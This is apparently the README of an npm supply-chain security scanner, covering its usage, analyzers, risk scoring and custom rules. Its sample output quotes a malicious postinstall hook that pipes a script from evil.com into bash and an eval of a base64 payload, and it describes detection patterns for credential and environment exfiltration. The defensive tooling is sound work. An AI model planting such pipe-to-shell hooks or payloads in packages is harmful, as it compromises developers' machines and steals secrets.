# aegis

[![CI](https://img.shields.io/github/actions/workflow/status/z8run/aegis/quality.yml?branch=main&label=CI)](https://github.com/z8run/aegis/actions)
[![codecov](https://codecov.io/gh/z8run/aegis/graph/badge.svg)](https://codecov.io/gh/z8run/aegis)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

Supply-chain security scanner for npm packages. Detect malicious code, typosquatting, and compromised packages **before** you install them.

```
$ aegis-scan check suspicious-pkg@1.0.0

  📦 suspicious-pkg@1.0.0

  ⛔ CRITICAL — Code Execution
  │  eval() with base64 encoded payload
  │  📄 lib/index.js:14
  │  └─ eval(Buffer.from("d2luZG93cy5sb2NhdGlvbg==", "base64").toString())

  ⚠️  HIGH — Install Script
  │  postinstall downloads and executes remote script
  │  📄 package.json
  │  └─ "postinstall": "curl https://evil.com | bash"

  Risk: 8.5/10 — DO NOT INSTALL
```

## Installation

### From crates.io

```bash
cargo install aegis-scan
```

### From source

```bash
git clone https://github.com/z8run/aegis.git
cd aegis
cargo install --path .
```

### Pre-built binaries

Download from the [releases page](https://github.com/z8run/aegis/releases).

| Platform | Binary |
|---|---|
| Linux x86_64 | `aegis-linux-x86_64` |
| macOS Apple Silicon | `aegis-macos-arm64` |
| macOS Intel | `aegis-macos-x86_64` |

## Usage

### Check a package

```bash
aegis-scan check axios
aegis-scan check axios@1.7.0
aegis-scan check @angular/core@17.0.0
```

### Scan a project

```bash
aegis-scan scan .
aegis-scan scan ./my-project --skip-dev
```

### Install with security check

```bash
aegis-scan install axios express        # check then install
aegis-scan install                       # check all deps then npm install
aegis-scan install axios --force         # skip confirmation prompts
```

### Output formats

```bash
aegis-scan check lodash --json           # JSON output
aegis-scan check lodash --sarif          # SARIF v2.1.0 (GitHub Security tab)
```

### Cache management

```bash
aegis-scan cache clear                   # clear all cached results
aegis-scan check axios --no-cache        # bypass cache for this check
```

## What it detects

13 analyzers run on every package:

| Analyzer | Description |
|---|---|
| **Static code** | `eval()`, `child_process`, network exfiltration, env harvesting via regex |
| **AST analysis** | tree-sitter parsing for JS/TS/TSX — structural detection of dangerous patterns |
| **Anti-evasion** | String concatenation tricks (`'ev'+'al'`), bracket notation (`global['eval']`), base64-encoded function names (`atob('ZXZhbA==')`), indirect eval (`(0,eval)`), and variable aliasing |
| **Binary inspection** | Scans `.wasm`, `.node`, `.exe`, `.dll`, `.so` files; extracts strings to find embedded URLs, shell commands, and credential patterns; measures entropy for packed/encrypted payloads |
| **Data flow analysis** | Lightweight taint tracking for multi-step attack patterns: env exfiltration (`process.env` -> encode -> network send), dropper patterns (download -> write -> execute), credential theft (`.npmrc`/`.ssh` -> network) |
| **Provenance verification** | Compares npm tarball contents against the GitHub source repo; detects injected files not in source; checks for npm Sigstore provenance attestations |
| **Install scripts** | Suspicious `postinstall`/`preinstall` commands |
| **Obfuscation** | High entropy, hex/base64 payloads, encoded strings, multiline `/* */` comment stripping to reduce false positives |
| **Maintainer tracking** | Ownership transfers, new accounts, takeovers |
| **AI hallucination** | Packages that LLMs "invent" — a growing attack vector |
| **Typosquatting** | Normalized Levenshtein distance, plugin/extension whitelist, homoglyph detection |
| **CVE lookup** | Known vulnerabilities via OSV.dev |
| **Dependency tree** | Recursive scan of transitive dependencies |
| **YAML rules** | 10 built-in rules + custom community rules |

### Security hardening

- **Path traversal protection** in tarball extraction (defends against zip-slip style attacks)
- **SSRF validation** on all outbound requests

## Risk scoring

Findings are weighted by severity and summed to a 0-10 score:

| Severity | Weight | Example |
|---|---|---|
| Critical | 3.0 | `eval(Buffer.from(...))`, pipe-to-shell |
| High | 1.5 | `require('child_process')`, env harvesting |
| Medium | 0.5 | DNS lookups, WebSocket connections |
| Low | 0.1 | `fetch()` with dynamic URL, file reads |

| Score | Label |
|---|---|
| 0-1 | CLEAN |
| 1-3 | LOW RISK |
| 3-5 | MEDIUM RISK |
| 5-7 | HIGH RISK |
| 7-10 | DO NOT INSTALL |

## CI/CD

### GitHub Action

```yaml
- uses: z8run/aegis-action@v1
  with:
    path: '.'
    fail-on: 'high'       # critical, high, medium, low
    skip-dev: 'false'
    sarif: 'true'          # upload to GitHub Security tab
```

### Exit codes

| Code | Meaning |
|---|---|
| `0` | No high-risk findings |
| `1` | HIGH or CRITICAL findings detected |
| `2` | Runtime error |

## Custom rules

Place `.yml` files in a `rules/` directory:

```yaml
id: "CUSTOM-001"
name: "Crypto wallet regex"
description: "Flags packages containing crypto wallet address patterns"
severity: high
category: suspicious
pattern: "(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"
file_pattern: "*.js"
exclude_paths:
  - "node_modules/"
  - "test/"
  - "*.min.js"
```

See [`rules/examples/`](rules/examples/) for more.

## Architecture

```
npm registry → tarball extraction → analyzers → risk scoring → output
                                        │
            ┌──────────────┬────────────┼────────────┬──────────────┐
            │              │            │            │              │
      static + AST    binary +     metadata     provenance    external APIs
     (code, evasion,  data flow   (maintainer,  (source vs    (CVE, dep tree)
      obfuscation)    (taint)     hallucination) tarball)
```

Results are cached locally (`~/.aegis/cache/`) for 24 hours.

## Contributing

See [CONTRIBUTING.md](.github/CONTRIBUTING.md) for development setup and guidelines.

## License

[MIT](LICENSE)
